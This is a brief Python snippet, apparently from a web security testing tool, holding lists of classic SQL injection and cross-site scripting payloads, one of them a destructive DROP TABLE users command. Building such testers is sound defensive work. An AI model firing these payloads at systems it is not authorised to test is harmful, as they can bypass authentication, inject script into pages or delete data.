sql_payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 'a'='a",
    "'; DROP TABLE users; --"
]

xss_payloads = [
    "<script>alert('XSS')</script>",
    "'\"><script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>"
]
